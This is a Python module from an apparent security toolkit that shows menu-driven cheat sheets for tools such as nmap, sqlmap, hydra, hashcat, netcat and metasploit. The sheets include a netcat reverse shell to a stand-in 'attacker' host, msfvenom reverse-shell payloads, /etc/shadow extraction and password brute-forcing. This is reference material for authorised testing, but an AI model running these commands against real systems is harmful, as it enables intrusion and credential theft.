from rich.console import Console
from rich.panel import Panel
from InquirerPy import inquirer
from sectools.theme import accent

SHEETS = {
    "nmap": """[bold cyan]Nmap Cheat Sheet[/bold cyan]

[bold]Scan Types:[/bold]
  -sS          TCP SYN (stealth) scan
  -sT          TCP connect scan
  -sU          UDP scan
  -sV          Version detection
  -O           OS detection
  -A           Aggressive (OS + version + scripts + traceroute)

[bold]Port Selection:[/bold]
  -p 80,443    Specific ports
  -p-          All 65535 ports
  --top-ports 100  Top 100 common ports
  -F           Fast scan (top 100)

[bold]Speed & Timing:[/bold]
  -T0 to -T5  Timing templates (0=paranoid, 5=insane)

[bold]Output:[/bold]
  -oN file     Normal output
  -oX file     XML output
  -oG file     Grepable output
  -oA base     All formats

[bold]Scripts:[/bold]
  --script vuln            Vulnerability scripts
  --script=default         Default script set
  --script smb-enum-shares SMB shares enum

[bold]Examples:[/bold]
  nmap -sV -sC 10.0.0.1         Service + default scripts
  nmap -sS -T4 -p- 10.0.0.0/24  Fast SYN scan all ports on subnet
  nmap --script vuln 10.0.0.1    Vulnerability scan""",

    "nikto": """[bold cyan]Nikto Cheat Sheet[/bold cyan]

[bold]Common Flags:[/bold]
  -h host      Target host
  -p port      Target port
  -ssl         Force SSL
  -nossl       Disable SSL
  -Tuning x    Scan tuning (1-9, a-c)
  -output f    Save to file
  -Format htm  Output format (htm, csv, txt, xml)

[bold]Tuning Options:[/bold]
  1  Interesting File        6  Denial of Service
  2  Misconfiguration        7  Remote File Retrieval
  3  Information Disclosure   8  Command Execution
  4  Injection (XSS/Script)  9  SQL Injection
  5  Remote File Retrieval

[bold]Examples:[/bold]
  nikto -h http://target.com -ssl
  nikto -h 10.0.0.1 -p 8080
  nikto -h target.com -Tuning 1234 -output report.html""",

    "gobuster": """[bold cyan]Gobuster Cheat Sheet[/bold cyan]

[bold]Modes:[/bold]
  dir    Directory/file brute-force
  dns    DNS subdomain brute-force
  vhost  Virtual host brute-force

[bold]Common Flags (dir):[/bold]
  -u URL           Target URL
  -w wordlist      Wordlist path
  -x ext           File extensions (php,html,txt)
  -t threads       Number of threads (default 10)
  -s codes         Status codes to match (200,301,302)
  -b codes         Status codes to blacklist
  -k               Skip TLS verification
  -r               Follow redirects
  -o file          Output to file

[bold]Common Flags (dns):[/bold]
  -d domain        Target domain
  -w wordlist      Wordlist
  --wildcard       Force wildcard processing

[bold]Examples:[/bold]
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
  gobuster dir -u http://target.com -w list.txt -x php,html -t 50
  gobuster dns -d target.com -w subdomains.txt""",

    "metasploit": """[bold cyan]Metasploit Cheat Sheet[/bold cyan]

[bold]Core Commands:[/bold]
  search <term>      Search for modules
  use <module>       Select a module
  info               Show module info
  show options       Show module options
  set RHOSTS <ip>    Set target
  run / exploit      Execute module
  back               Deselect module

[bold]Common Modules:[/bold]
  auxiliary/scanner/portscan/tcp      Port scanner
  auxiliary/scanner/smb/smb_version   SMB version detect
  auxiliary/scanner/http/dir_scanner  HTTP directory scan
  exploit/multi/handler               Payload handler

[bold]Msfvenom Payloads:[/bold]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f exe > shell.exe
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f elf > shell.elf
  msfvenom -l payloads   List all payloads

[bold]Post Exploitation:[/bold]
  sysinfo, getuid, getsystem, hashdump, shell""",

    "sqlmap": """[bold cyan]SQLMap Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  -u URL              Target URL with parameter
  --dbs               Enumerate databases
  -D db --tables      Enumerate tables
  -D db -T tbl --dump Dump table data
  --batch             Non-interactive mode

[bold]Detection:[/bold]
  --level 1-5         Test level (default 1)
  --risk 1-3          Risk level (default 1)
  --technique BEUSTQ  Injection techniques

[bold]Useful Flags:[/bold]
  --crawl=3           Crawl site (depth 3)
  --forms             Auto-test forms
  --random-agent      Random User-Agent
  --proxy http://x    Use proxy
  --os-shell          OS shell
  --sql-shell         SQL shell
  --threads 5         Concurrent requests

[bold]Examples:[/bold]
  sqlmap -u "http://target/page?id=1" --dbs --batch
  sqlmap -u "http://target/page?id=1" -D mydb --tables
  sqlmap -u "http://target/page?id=1" --forms --crawl=2""",

    "hydra": """[bold cyan]Hydra Cheat Sheet[/bold cyan]

[bold]Syntax:[/bold]
  hydra -l user -P passlist target service

[bold]Common Flags:[/bold]
  -l user        Single username
  -L userlist    Username list
  -p pass        Single password
  -P passlist    Password list
  -t threads     Threads (default 16)
  -s port        Custom port
  -f             Stop on first found
  -vV            Verbose output

[bold]Services:[/bold]
  ssh, ftp, http-post-form, smtp, mysql, rdp, vnc, telnet, smb

[bold]HTTP Form Example:[/bold]
  hydra -l admin -P list.txt target http-post-form \\
    "/login:user=^USER^&pass=^PASS^:F=Invalid"

[bold]Examples:[/bold]
  hydra -l root -P rockyou.txt 10.0.0.1 ssh
  hydra -L users.txt -P pass.txt 10.0.0.1 ftp -t 4""",

    "john": """[bold cyan]John the Ripper Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  john hashfile              Auto-detect and crack
  john --show hashfile       Show cracked passwords
  john --wordlist=list hash  Dictionary attack

[bold]Common Flags:[/bold]
  --wordlist=file    Dictionary file
  --rules            Enable word mangling rules
  --incremental      Brute-force mode
  --format=type      Force hash format
  --fork=N           Use N processes

[bold]Hash Formats:[/bold]
  --format=raw-md5, raw-sha1, raw-sha256, bcrypt, nt, zip, rar

[bold]Utility:[/bold]
  unshadow /etc/passwd /etc/shadow > hashes.txt
  zip2john file.zip > hash.txt
  rar2john file.rar > hash.txt

[bold]Examples:[/bold]
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  john --incremental --format=raw-md5 hashes.txt""",

    "hashcat": """[bold cyan]Hashcat Cheat Sheet[/bold cyan]

[bold]Syntax:[/bold]
  hashcat -m type -a mode hashfile wordlist

[bold]Attack Modes (-a):[/bold]
  0  Dictionary       3  Brute-force/Mask
  1  Combination      6  Hybrid (dict+mask)

[bold]Common Hash Types (-m):[/bold]
  0     MD5            1000  NTLM
  100   SHA-1          3200  bcrypt
  1400  SHA-256        22000 WPA/WPA2

[bold]Mask Charset:[/bold]
  ?l lowercase  ?u uppercase  ?d digits  ?s special  ?a all

[bold]Useful Flags:[/bold]
  --show           Show cracked
  -O               Optimized kernels
  -w 3             Workload (1-4)
  --force          Ignore warnings
  -r rules.rule    Apply rules

[bold]Examples:[/bold]
  hashcat -m 0 -a 0 hashes.txt rockyou.txt
  hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a
  hashcat -m 0 hashes.txt --show""",

    "netcat": """[bold cyan]Netcat Cheat Sheet[/bold cyan]

[bold]Listen & Connect:[/bold]
  nc -lvp 4444              Listen on port
  nc target 4444            Connect to port
  nc -lvp 4444 -e /bin/sh   Bind shell (ncat)

[bold]File Transfer:[/bold]
  Receiver: nc -lvp 4444 > file.txt
  Sender:   nc target 4444 < file.txt

[bold]Port Scanning:[/bold]
  nc -zv target 1-1000      Scan ports 1-1000

[bold]Reverse Shell:[/bold]
  Listener: nc -lvp 4444
  Target:   nc attacker 4444 -e /bin/sh

[bold]Chat:[/bold]
  Server: nc -lvp 4444
  Client: nc server 4444

[bold]Flags:[/bold]
  -l   Listen mode        -v   Verbose
  -p   Port               -z   Zero-I/O (scan)
  -u   UDP mode           -w N Timeout (seconds)
  -e   Execute program    -k   Keep listening""",

    "recon": """[bold cyan]Recon Autopilot Cheat Sheet[/bold cyan]

[bold]What it does:[/bold]
  Chains multiple tools automatically:
  • Nmap for port/service discovery
  • Nikto for web vulnerability scanning
  • Gobuster for directory brute-forcing
  • SQLMap for SQL injection crawling

[bold]Presets:[/bold]
  Quick recon    — Nmap fast + Gobuster
  Full recon     — Nmap + Nikto + Gobuster
  Web app recon  — Nikto + Gobuster + SQLMap crawl
  Stealth recon  — Nmap SYN scan only

[bold]Tips:[/bold]
  • Results are combined into a single timestamped log
  • Each scan has a 5-minute timeout
  • Skips tools that aren't installed""",

    "wpscan": """[bold cyan]WPScan Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  wpscan --url URL           Scan a WordPress site
  --enumerate p              Enumerate plugins
  --enumerate u              Enumerate users
  --enumerate t              Enumerate themes
  --enumerate ap,at,u        Full enumeration

[bold]Detection:[/bold]
  --plugins-detection aggressive   Deep plugin search
  --detection-mode mixed           Mixed detection
  --api-token TOKEN                Use WPVulnDB API

[bold]Brute Force:[/bold]
  --passwords list.txt       Password list
  --usernames admin          Target user
  --max-threads 10           Thread count

[bold]Examples:[/bold]
  wpscan --url http://target.com --enumerate p
  wpscan --url http://target.com -e ap,at,u --api-token TOKEN
  wpscan --url http://target.com --passwords rockyou.txt --usernames admin""",

    "ffuf": """[bold cyan]Ffuf Cheat Sheet[/bold cyan]

[bold]Modes:[/bold]
  Directory:   ffuf -u URL/FUZZ -w wordlist
  Subdomain:   ffuf -u URL -H "Host: FUZZ.target" -w wordlist
  Parameter:   ffuf -u URL?FUZZ=value -w wordlist
  POST:        ffuf -u URL -X POST -d "param=FUZZ" -w wordlist

[bold]Common Flags:[/bold]
  -w wordlist      Wordlist file
  -u URL           Target URL (use FUZZ as placeholder)
  -t threads       Thread count (default 40)
  -mc codes        Match HTTP status codes (200,301)
  -fc codes        Filter HTTP status codes
  -fs size         Filter response size
  -fw words        Filter by word count
  -e extensions    File extensions (.php,.html)
  -H header        Add header
  -X method        HTTP method
  -d data          POST data
  -o output        Output file
  -of format       Output format (json,csv,html)

[bold]Examples:[/bold]
  ffuf -u https://target.com/FUZZ -w common.txt -mc 200
  ffuf -u https://target.com/FUZZ -w list.txt -e .php,.html -t 50
  ffuf -u https://FUZZ.target.com -w subdomains.txt -fc 404""",

    "nuclei": """[bold cyan]Nuclei Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  nuclei -u URL              Scan single target
  nuclei -l urls.txt         Scan list of targets
  nuclei -u URL -t template  Use specific template

[bold]Template Selection:[/bold]
  -t cves/                   CVE templates
  -t exposed-panels/         Exposed admin panels
  -t misconfiguration/       Misconfig checks
  -t technologies/           Technology detection
  -s critical,high           Filter by severity
  -tags cve,rce              Filter by tags

[bold]Output:[/bold]
  -o output.txt              Save results
  -json                      JSON output
  -silent                    Silent mode

[bold]Performance:[/bold]
  -c 25                      Concurrent templates
  -rl 150                    Rate limit (req/sec)
  -bs 25                     Bulk size

[bold]Examples:[/bold]
  nuclei -u https://target.com -s critical,high
  nuclei -u https://target.com -t cves/ -o results.txt
  nuclei -l urls.txt -t exposed-panels/ -json""",

    "enum4linux": """[bold cyan]Enum4Linux Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  enum4linux -a target       Full enumeration
  enum4linux -U target       Enumerate users
  enum4linux -S target       Enumerate shares
  enum4linux -P target       Password policy
  enum4linux -G target       Enumerate groups
  enum4linux -o target       OS information

[bold]Authentication:[/bold]
  -u user -p pass            Authenticate
  -w workgroup               Specify workgroup

[bold]Other:[/bold]
  -r                         Enumerate users via RID cycling
  -R range                   RID range (default 500-550,1000-1050)
  -d                         Detail mode
  -v                         Verbose

[bold]Examples:[/bold]
  enum4linux -a 10.10.10.1
  enum4linux -U -S 10.10.10.1
  enum4linux -u admin -p pass -a 10.10.10.1""",

    "whatweb": """[bold cyan]WhatWeb Cheat Sheet[/bold cyan]

[bold]Aggression Levels:[/bold]
  --aggression 1    Stealthy (1 request)
  --aggression 3    Standard (some extra requests)
  --aggression 4    Aggressive (many requests)

[bold]Common Flags:[/bold]
  -v                Verbose output
  -a LEVEL          Aggression level (1-4)
  --color=never     No color output
  --log-brief FILE  Brief log
  --log-json FILE   JSON log
  -U agent          Custom User-Agent

[bold]Examples:[/bold]
  whatweb https://target.com
  whatweb -v --aggression 3 https://target.com
  whatweb -a 4 --log-json output.json https://target.com""",

    "dns": """[bold cyan]DNS Toolkit Cheat Sheet[/bold cyan]

[bold]dig Commands:[/bold]
  dig domain              A records
  dig domain MX           Mail servers
  dig domain NS           Name servers
  dig domain TXT          TXT records
  dig domain ANY          All records
  dig -x IP               Reverse DNS
  dig @ns domain AXFR     Zone transfer

[bold]Useful Flags:[/bold]
  +short                  Short output
  +trace                  Trace resolution
  +noall +answer          Just the answer
  @server                 Use specific DNS server

[bold]Examples:[/bold]
  dig example.com +short
  dig -x 8.8.8.8
  dig @8.8.8.8 example.com ANY""",

    "whois": """[bold cyan]Whois Cheat Sheet[/bold cyan]

[bold]Usage:[/bold]
  whois domain.com         Domain lookup
  whois IP                 IP lookup

[bold]What You Get:[/bold]
  Registrar, creation/expiry dates, name servers,
  registrant info, DNSSEC status, abuse contacts

[bold]Tips:[/bold]
  Some domains have WHOIS privacy enabled
  Use -H flag to suppress legal disclaimers
  Regional registries: ARIN, RIPE, APNIC, LACNIC, AFRINIC""",

    "sslscan": """[bold cyan]SSLScan Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  sslscan target:port      Scan TLS/SSL
  sslscan target           Default port 443

[bold]Common Flags:[/bold]
  --show-certificate       Show full cert details
  --no-colour              Plain text output
  --tls10                  Test TLS 1.0
  --tls11                  Test TLS 1.1
  --tls12                  Test TLS 1.2
  --tls13                  Test TLS 1.3
  --ssl2                   Test SSLv2
  --ssl3                   Test SSLv3
  --xml=file               XML output

[bold]What It Checks:[/bold]
  Supported protocols, cipher suites, certificate info,
  key exchange, heartbleed vulnerability, compression

[bold]Examples:[/bold]
  sslscan example.com
  sslscan --show-certificate example.com:443
  sslscan --tls12 --xml=results.xml target.com""",

    "masscan": """[bold cyan]Masscan Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  masscan target -p ports    Scan specific ports
  masscan target --top-ports N  Top N ports

[bold]Common Flags:[/bold]
  -p 80,443               Specific ports
  -p 0-65535              All ports
  --top-ports 100         Top 100 ports
  --rate 1000             Packets per second
  -oX file                XML output
  -oG file                Grepable output
  --banners               Grab banners

[bold]Important:[/bold]
  Masscan requires root/sudo for raw packet scanning
  Use --rate carefully to avoid overwhelming networks
  Default rate is 100 pps (very slow)

[bold]Examples:[/bold]
  sudo masscan 10.0.0.0/24 -p80,443 --rate 1000
  sudo masscan 10.0.0.1 --top-ports 1000 --rate 5000
  sudo masscan 10.0.0.0/8 -p0-65535 --rate 100000""",

    "subfinder": """[bold cyan]Subfinder Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  subfinder -d domain       Find subdomains
  subfinder -dL domains.txt From file

[bold]Common Flags:[/bold]
  -silent                  Only show results
  -recursive               Recursive enumeration
  -all                     Use all sources
  -t threads               Thread count
  -o output.txt            Save results
  -oJ                      JSON output
  -nW                      No wildcard filtering
  -timeout seconds         Timeout per source

[bold]Config:[/bold]
  Provider API keys in ~/.config/subfinder/provider-config.yaml
  Supports: Shodan, Censys, SecurityTrails, VirusTotal, etc.

[bold]Examples:[/bold]
  subfinder -d target.com -silent
  subfinder -d target.com -all -recursive -o subs.txt
  subfinder -dL domains.txt -t 30 -silent""",

    "wafw00f": """[bold cyan]Wafw00f Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  wafw00f URL              Detect WAF
  wafw00f -l               List all detectable WAFs
  wafw00f -a URL           Test all WAFs

[bold]Common Flags:[/bold]
  -v                       Verbose
  -a                       Test all (don't stop at first match)
  -o file                  Output to file
  -f format                Output format (json, csv, txt)

[bold]What It Detects:[/bold]
  Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity,
  F5 BIG-IP, Barracuda, Sucuri, Wordfence, and 100+ more

[bold]Examples:[/bold]
  wafw00f https://target.com
  wafw00f -a -v https://target.com
  wafw00f https://target.com -o results.json -f json""",

    "dirb": """[bold cyan]Dirb Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  dirb URL wordlist        Brute force directories
  dirb URL                 Use default wordlist

[bold]Common Flags:[/bold]
  -r                       Non-recursive
  -f                       Show NOT_FOUND pages
  -i                       Case-insensitive
  -z milliseconds          Add delay
  -o output                Save to file
  -X ext                   Extensions (.php,.html)
  -a agent                 Custom User-Agent
  -p proxy:port            Use proxy
  -c cookie                Set cookie
  -H header                Add header

[bold]Examples:[/bold]
  dirb http://target.com /usr/share/wordlists/dirb/common.txt
  dirb http://target.com common.txt -X .php,.html -r
  dirb http://target.com -i -f -o results.txt""",
}

# Map menu names to sheet keys
TOOL_KEY_MAP = {
    "Nmap — Network Scanner": "nmap",
    "Nikto — Web Server Scanner": "nikto",
    "Gobuster — Directory & DNS Brute Force": "gobuster",
    "Metasploit — Exploitation Framework": "metasploit",
    "SQLMap — SQL Injection Tester": "sqlmap",
    "Hydra — Brute Force": "hydra",
    "John the Ripper — Password Cracker": "john",
    "Hashcat — GPU Password Cracker": "hashcat",
    "Netcat — Network Swiss Army Knife": "netcat",
    "Recon Autopilot — Auto-scan a target": "recon",
    "WPScan -- WordPress Scanner": "wpscan",
    "Ffuf -- Web Fuzzer": "ffuf",
    "Nuclei -- Vulnerability Scanner": "nuclei",
    "Enum4Linux -- SMB Enumeration": "enum4linux",
    "WhatWeb -- Technology Identifier": "whatweb",
    "DNS Toolkit": "dns",
    "Whois -- Domain Lookup": "whois",
    "SSLScan -- TLS/SSL Analyzer": "sslscan",
    "Masscan -- Fast Port Scanner": "masscan",
    "Subfinder -- Subdomain Discovery": "subfinder",
    "Wafw00f -- WAF Detector": "wafw00f",
    "Dirb -- URL Brute Forcer": "dirb",
}


def show_cheatsheet(console: Console, tool_key: str):
    """Display a cheat sheet for the given tool key."""
    sheet = SHEETS.get(tool_key)
    if not sheet:
        console.print(f"[red]No cheat sheet for '{tool_key}'.[/red]")
        return
    title = TOOL_KEY_MAP.get(tool_key, tool_key)
    # Reverse lookup for display title
    for display_name, key in TOOL_KEY_MAP.items():
        if key == tool_key:
            title = display_name
            break
    console.print(Panel(
        sheet,
        title=f"[bold bright_white] {title} [/bold bright_white]",
        border_style=accent(),
        padding=(1, 3),
        subtitle="[dim]Press q to exit | SecTools Cheat Sheets[/dim]",
    ))


def cheatsheet_menu(console: Console):
    """Show sub-menu to pick a tool cheat sheet."""
    choices = list(TOOL_KEY_MAP.keys()) + ["Back"]
    choice = inquirer.select(
        message="Pick a tool:",
        choices=choices,
        pointer="❯",
    ).execute()
    if choice != "Back":
        tool_key = TOOL_KEY_MAP.get(choice, choice)
        show_cheatsheet(console, tool_key)
